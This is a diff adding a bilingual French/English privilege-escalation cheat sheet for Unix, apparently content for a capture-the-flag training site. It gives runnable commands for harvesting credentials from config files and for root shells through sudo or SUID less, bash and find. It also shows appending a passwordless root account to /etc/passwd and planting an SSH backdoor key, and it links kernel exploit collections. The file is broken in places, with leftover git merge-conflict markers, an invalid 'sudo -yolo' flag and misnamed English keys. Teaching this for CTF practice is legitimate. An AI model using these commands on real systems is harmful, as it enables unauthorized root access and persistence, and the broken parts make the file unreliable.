@@ -1,0 +1,585 @@
+[Intro]
+id=intro
+category=PrivEscUx
+title="Elevation de Privilege - Unix"
+title_en="Privilege Elevation - Unix"
+desc="
+Techniques d'élévation de privilège pour Unix.
+"
+desc_en="
+Privilege elevation techniques for Unix.
+"
+
+
+[privelev]
+id=privelev
+category=PrivEscUx
+keywords=
+title=Principe
+desc="
+Nous venons tout juste d'obtenir l'accès en shell à un serveur. 
+Nous allons commencer par faire un inventaire exhaustif de ce qui est accessible au compte sur lequel nous pouvons executer des commandes.<br/>
+- Identifier l'OS, sa version, les patchs de sécurité manquants
+- Recenser les outils disponibles : netcat, python, perl..
+- Lire tous les fichiers de config, temporaires, backup pour trouver des login/password.<br/>
+- Utiliser les éventuels droits sudo du compte.<br/>
+- Trouver une commande avec SetUID bit.<br/>
+- Trouver un process qui tourne en tache de fond avec des droits root et modifier ses inputs.<br/>
+- Trouver un exploit kernel. Cette dernière option, radicale car elle peut planter la machine, est trés efficace sur les vieux serveurs...
+
+Sur ses premières machines, il est préférable de faire ces énumérations en lançant les commandes manuellement pour s'approprier les options et les outputs. Une fois à l'aise, et sachant ce que l'on chercher, il est possible d'utiliser des scripts qui font ces énumérations pour nous.
+"
+title_en=Principle
+desc_en="
+You just got shell access to a server. 
+Let start by an exhaustive inventory of what is accessible to your account.<br/>
+- Identify the OS, its version, the missing security patches
+- List available tools: netcat, python, perl...
+- Read all config, temporary, backup files to find login/password.<br/>
+- Use the possible sudo rights of the account.<br/>
+- Find commands with SetUID bit.<br/>
+- Find a process running in the background with root rights and modify its inputs.<br/>
+- Find a kernel exploit. This last option, radical because it can crash the machine, is very efficient on old servers...
+
+On your first servers, it is preferable to make these enumerations by launching the commands manually, so you can appropriate the options and outputs. Once comfortable, and knowing what you are looking for, feel free to use scripts that do these enumerations for you.
+"
+
+
+;;;;;;;;;;;;;;;;;;; Config Files
+[section-privesc-config]
+id=section
+category=PrivEscUx
+title="Fichiers contenant des informations"
+title_en="Files containing usefull informations"
+
+
+
+
+[Files]
+id=fichiers
+category=PrivEscUx
+keywords=
+title=Fichiers intéressants: txt, cfg,...
+desc_enc=
+desc="
+Rechercher les fichiers .txt ou .cfg, appartanant aux autres comptes, avec des droits en lecture trop ouverts.
+<pre><code>find /home -readable -type f  \( -iname \*.txt -o -iname \*.cfg \) 2>/dev/null
+find /home -E . -regex '.*\.(txt|cfg)' 2>/dev/null
+</code></pre>  
+"   
+title_en=Find readables files
+desc_en="
+Find .txt or .cfg files, owned by other accounts, and readable.
+<pre><code>find /home -readable -type f  \( -iname \*.txt -o -iname \*.cfg \) 2>/dev/null
+find /home -E . -regex '.*\.(txt|cfg)' 2>/dev/null
+</code></pre>  
+"   
+
+
+
+
+[Wordpress]
+id=wordpress
+category=PrivEscUx
+keywords=
+desc_enc=
+title=Web app: Wordpress
+desc="
+Le fichier de config d'une appli wordpress s'appelle:
+<pre><code>wp-config.php
+</code></pre>    
+Pour le chercher:
+ <pre><code>find /var -name wp-config.php 2>/dev/null
+</code></pre>
+Ce fichier contient les login/password pour se connecter à la base de donnée. Il est possible de dumper la base de donnée et récupérer les login et hashes des comptes wordpress.
+"   
+title_en=Web app: Wordpress
+desc_en="
+Wordpress config file is:
+<pre><code>wp-config.php
+</code></pre>    
+Let find it:
+ <pre><code>find /var -name wp-config.php 2>/dev/null
+</code></pre>
+This config file contains login/password used to connect to the blog database. By dumping the database, it's thus possible to get wordpress user's login and password hashes.
+"  
+
+
+
+
+[Apache]
+id=apache
+category=PrivEscUx
+keywords=
+desc_enc=
+title=Web server: Apache
+desc="
+Le fichier de config peut porter deux noms:
+<pre><code>httpd.conf
+apache2.conf
+</code></pre>    
+On le trouve généralement dans un des répertoires:
+<pre><code>/etc/apache2/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/httpd.conf
+/etc/httpd/conf/httpd.conf
+</code></pre>
+"   
+title_en=Web server: Apache
+desc_en="
+Apache config file name may be :
+<pre><code>httpd.conf
+apache2.conf
+</code></pre>    
+On le trouve généralement dans un des répertoires:
+<pre><code>/etc/apache2/httpd.conf
+/etc/apache2/apache2.conf
+/etc/httpd/httpd.conf
+/etc/httpd/conf/httpd.conf
+</code></pre>
+"  
+
+
+// 
+[Tomcat]
+id=tomcat
+category=PrivEscUx
+keywords=
+desc_enc=
+title=Web server: Tomcat
+desc="
+Le fichier de config porte le nom:
+<pre><code>server.xml
+</code></pre> 
+Les mots de passe des utilisateurs se trouvent dans:
+<pre><code>tomcat-users.xml
+</code></pre> 
+On trouve généralement ces fichiers dans un des répertoires:
+<pre><code>TOMCAT-HOME/conf/
+/usr/local/tomcat/conf/
+</code></pre>
+"   
+title_en=Web server: Tomcat
+desc_en="
+Tomcat config file is named:
+<pre><code>server.xml
+</code></pre> 
+User's accounts can be found in :
+<pre><code>tomcat-users.xml
+</code></pre> 
+Thos files are usually found in:
+<pre><code>TOMCAT-HOME/conf/
+/usr/local/tomcat/conf/
+</code></pre>
+"  
+
+;;;;;;;;;;;;;;;;;;;; sudo
+[section-privesc-sudo]
+id=section
+category=PrivEscUx
+title="Sudo"
+
+[sudo]
+id=sudo
+category=PrivEscUx
+keywords=
+title=Sudo 
+desc="
+Sudo permet de lancer des commandes en tant qu'un autre utilisateur.<br/>
+<br/>
+Pour connaitre les droits sudo de votre compte, il faut lancer la commande sudo -l et saisir votre mot de passe:
+<pre><code>sudo -l
+L'utilisateur user1 peut utiliser les commandes suivantes sur target-host :
+    (ALL) NOPASSWD: /usr/bin/find
+    user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
+</code></pre>
+Il est alors possible de lancer des commandes en tant que user2 avec le flag -u user2
+<pre><code>sudo /usr/bin/find  
+sudo -u user2 /usr/bin/python3  /home/user2/run.py 
+</code></pre>
+Vous pouvez lancer find avec les droits d'un compte root, et run.py avec les droits du compte user2.<br/>
+<br/>
+Si l'option NOPASSWD n'est pas définie, la commande sudo demande le mot de passe du compte courant. Si vous être entré par un webshell, ou une connection ssh avec clef privée, il faudra se débrouiller pour connaitre le mot de passe.<br/>
+"
+
+title_en=Sudo 
+desc_en="
+Sudo allows to launch commands as another user.<br/>
+<br/>
+To know the sudo rights of your account, you must launch the command sudo -l and enter your password:
+<pre><code>sudo -l
+User1 can use the following commands on target-host :
+    (ALL) NOPASSWD: /usr/bin/find
+    user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
+</code></pre>
+It is then possible to run commands as user2 with the option -u user2
+<pre><code>sudo /usr/bin/find  
+sudo -u user2 /usr/bin/python3  /home/user2/run.py 
+</code></pre>
+You can run find with root account rights, and run.py with user2 account rights..<br/>
+<br/>
+If the NOPASSWD option is not defined, the sudo command asks for the current account password. If you have entered through a webshell, or an ssh connection with a private key, you will have to manage to know the password.<br/>
+"
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;; SetUIDbit
+[section-privesc-sbit]
+id=section
+category=PrivEscUx
+title="SetUID bit"
+
+[setUID]
+id=setUID
+category=PrivEscUx
+keywords=
+title=SetUID bits
+desc="
+Identifier les process possédant un setUID bit
+<pre><code>find / -perm -4000 -exec ls -al {} \; 2>/dev/null
+</code></pre>
+Que faire avec un binaire possédant un setUID bit ?
+<pre><code>- Lancer un shell
+- Lire un flag
+- Copier un fichier
+- Ajouter une ligne à un fichier : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
+- ...
+</code></pre>
+"
+title_en=SetUID bits
+desc_en="
+Identify processes with a setUID bit
+<pre><code>find / -perm -4000 -exec ls -al {} \; 2>/dev/null
+</code></pre>
+What to do with a binary having a setUID bit ?
+<pre><code>- Run a shell
+- Read a flag
+- Copy a file
+- Add an entry in a file : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
+- ...
+</code></pre>
+"
+
+;;;;;;;;;;;;;;;;;;;; cmds
+[section-privesc-cmds]
+id=section
+category=PrivEscUx
+title="SUID/Sudo exploitation"
+title_en="SUID/Sudo exploitation"
+
+
+[shell]
+id=shell
+category=PrivEscUx
+keywords=
+title=Process permettant de lancer un shell
+desc="
+De nombreux process permettent de lancer un shell. Idéal s'ils sont en sudo ou avec un setUID bit.
+<pre><code>- find
+- nmap
+- vi
+- less
+- awk
+- tee
+...
+</code></pre>
+Reference: https://gtfobins.github.io/
+"
+title_en=Process to allowing to launch a shell
+desc_en="
+Many processes allow to launch a shell. Perfect with sudo or a setUID bit.
+<pre><code>- find
+- nmap
+- vi
+- less
+- awk
+- tee
+...
+</code></pre>
+Reference: https://gtfobins.github.io/
+"
+
+<<<<<<< HEAD
+[bash]
+id=bash
+category=PrivEscUx
+keywords=
+title=Bash: shell
+desc="Bash permet d'ouvrir un shell avec les droits d'un autre utilisateur.   
+Sudo   
+<pre><code>sudo bash -p
+</code></pre>
+Setuid bit positionné   
+<pre><code>./bash -p
+</code></pre>
+"
+title_en=Bash: shell
+desc_en="Bash can spawn a shell with another user rights.   
+Sudo   
+<pre><code>sudo bash -p
+</code></pre>
+Setuid bit set   
+<pre><code>./bash -p
+</code></pre>
+"
+=======
+
+[less]
+id=less
+category=PrivEscUx
+keywords=
+title="Sudo/SUID bit - less"
+desc="
+Less peut être utilisé pour lire des fichiers. Presser q pour sortir du lecteur.
+<pre><code>./less flag.txt
+</code></pre>
+ou pour obtenir un shell en ouvrant un fichier, et une fois dans le lecteur ouvrir un shell en tapant !/bin/sh
+<pre><code>./less fichier
+!/bin/sh
+</code></pre>
+"
+title_en="Sudo/SUID bit - less"
+desc_en="
+Less is used to read files. Press q to exit.
+<pre><code>./less flag.txt
+</code></pre>
+To open a shell, open a file, then !/bin/sh
+<pre><code>./less fichier
+!/bin/sh
+</code></pre>
+"
+
+
+[bash]
+id=privbash
+category=PrivEscUx
+keywords=
+title="Sudo/SUID bit - bash"
+desc="
+Lancé par sudo ou avec un SUID bit, bash va dropper ses privilèges. Pour garder l'identifiant root, utiliser l'option -p.
+<pre><code>sudo -yolo /bin/bash -p
+</code></pre>
+<pre><code>./bash -p
+</code></pre>
+"
+title_en="Sudo/SUID bit - bash"
+desc_en="
+Launched thanks sudo or with SUID bit set, bash drops its privileges. To keep root id, use -p option.
+<pre><code>bash -p
+</code></pre>
+"
+
+
+[findsh]
+id=findsh
+category=PrivEscUx
+keywords=
+title="Sudo/SUID bit - find"
+desc="
+Il est possible d'utiliser la commande -exec de find pour ouvrir un shell.   
+On recherche n'importe quel fichier, et c'est un prétexte pour lancer la commande /bin/sh.   
+Ici avec un sudo, le shell sera ouvert en tant que user2:   
+<pre><code>sudo -u user /usr/bin/find . -name readme.txt -exec /bin/sh \;
+</code></pre>
+Si on trouve la commande find, copiée dans un répertoire avec le SUID bit actif, on l'exploite de la même façon:
+<pre><code>./find . -name readme.txt -exec /bin/sh \;
+</code></pre>
+"
+title_en="Sudo/SUID bit - find"
+desc_en="
+To open a shell, find a known file then launch the command: /bin/sh.
+<pre><code>sudo /usr/bin/find . -name readme.txt -exec /bin/sh \;
+./find . -name readme.txt -exec /bin/sh \;
+"
+
+
+>>>>>>> 8b0cd3fef9928395a4dc74c8fad522913442630c
+
+[etcpasswd]
+id=etcpasswd
+category=PrivEscUx
+keywords=
+title=Ajouter un user root sans mot de passe
+desc="
+Vous disposez des droits pour modifier /etc/passwd. Par exemple tee avec un sudo en root.
+Ajoutez une entrée avec un UID de 0, et un mot de passe vide.
+<pre><code>echo "myroot::0:0:::/bin/bash" | sudo tee -a /etc/passwd 
+su myroot 
+</code></pre>
+"
+title_en=Add a passwordless account with root rights
+desc_en="
+If you have the rights to modify /etc/passwd, you can be root. For example tee with a sudo as root.
+Add an entry with a UID of 0 (root UID), and an empty password.
+<pre><code>echo "myroot::0:0:::/bin/bash" | sudo tee -a /etc/passwd 
+su myroot 
+</code></pre>
+"
+
+[pubkey]
+id=pubkey
+category=PrivEscUx
+keywords=
+title=Ajouter une backdoor ssh en injectant une clef publique.
+desc="
+Si une commande avec les droits root permet d'ajouter une ligne: ex: tee
+<pre><code>echo 'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com' | sudo tee -a /home/victim/.ssh/authorized_keys
+ssh -i id_rsa victim@iptarget
+</code></pre>
+"
+title_en=Create an ssh backdoor by adding a public key.
+desc_en="
+<pre><code>echo 'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com' > /home/victim/.ssh/authorized_keys
+ssh -i id_rsa victim@iptarget
+</code></pre>
+"
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;; Process root
+[section-privesc-process]
+id=section
+category=PrivEscUx
+title="Exploitation de process"
+title_en="Process exploitation"
+ 
+[ps]
+id=ps
+category=PrivEscUx
+keywords=
+title=ps
+desc="
+Identifier les process lancés par root
+<pre><code>ps eaxf
+</code></pre>
+Une fois un process identifé, regarder s'il est possible de modifier les fichiers lus par le process, ou si le process a des vulnérabilités connues.
+"
+title_en=ps
+desc_en="
+Identify processes running as root 
+<pre><code>ps eaxf
+</code></pre>
+Once an interresting process found, see if it's possible to modify the files read by the process, or if the process has known vulnerabilities.
+"
+
+
+[cron]
+id=cron
+category=PrivEscUx
+keywords=
+title=Cron
+desc="
+Identifier les taches lancées par cron.
+<pre><code>cat /etc/cron.d/*
+cat /var/spool/cron/*
+crontab -l
+cat /etc/crontab
+cat /etc/cron.(time)
+systemctl list-timers
+</code></pre>
+"
+title_en=Cron
+desc_en="
+Identify cron tasks.
+<pre><code>cat /etc/cron.d/*
+cat /var/spool/cron/*
+crontab -l
+cat /etc/crontab
+cat /etc/cron.(time)
+systemctl list-timers
+</code></pre>
+"
+
+
+[pspy]
+id=process
+category=PrivEscUx
+keywords=
+title=Monitorer les process
+desc="
+Avec la commande ps, vous risquez de passer à coté d'un petit process, lancé toutes les 2 minutes, et qui va traiter un fichier batch en 5 secondes avant de disparaitre.
+L'outil pspy monitore les process pour vous.
+<pre><code>https://github.com/DominicBreuker/pspy
+</code></pre>
+"
+title=Process Spy
+desc="
+With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
+The pspy tool monitors the processes for you.
+<pre><code>https://github.com/DominicBreuker/pspy
+</code></pre>
+"
+
+
+;;;;;;;;;;;;;;;;;;;; kernel
+[section-privesc-kernel]
+id=section
+category=PrivEscUx
+title="Kernel exploit"
+
+[os]
+id=os
+category=PrivEscUx
+keywords=
+title=Exploit kernel
+desc="
+Version de la distribution:
+<pre><code>cat /etc/issue
+Ubuntu 18.04.3 LTS 
+</code></pre>
+Version du kernel: 5.0.0-37-generic
+<pre><code>uname -a
+Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+Une fois la version du kernel connue, il est possible de chercher un exploit kernel<br/>
+https://github.com/SecWiki/linux-kernel-exploits<br/>
+Ne jamais lancer un binaire !<br/>
+Toujours récupérer les sources, les lire, comprendre ce quelles font, les compiler soi même, et seulement là les lancer... En sachant qu'il existe un risque élévé de planter le serveur.
+"
+title=Kernel exploit
+desc="
+Linux Distib version:
+<pre><code>cat /etc/issue
+Ubuntu 18.04.3 LTS 
+</code></pre>
+Linux kernel version: 5.0.0-37-generic
+<pre><code>uname -a
+Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+Once the kernel version is known, it is possible to search for a kernel exploit<br/>
+https://github.com/SecWiki/linux-kernel-exploits<br/>
+Never run an unknown binary !<br/>
+Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.
+"
+
+
+;;;;;;;;;;;;;;;;;;;;;;;; Linux Enum batch
+[section-privesc-linenum]
+id=section
+category=PrivEscUx
+title="Scripts d'énumération"
+title="Enumeration scripts"
+
+[linenum]
+id=linenum
+category=PrivEscUx
+keywords=
+title="Scrits d'enumeration"
+desc="
+Des scripts font une énumération complete. <br/>
+Il faut les tester et trouver celui qui a le format de sortie qui convient le mieux.
+<pre><code>linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
+unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
+lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
+</code></pre>
+"
+title=Enum scripts
+desc="
+Some well known script automate the enumeration process.<br/>
+Test them and find the one that suits you best.
+<pre><code>linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
+unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
+lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
+</code></pre>
+"
+
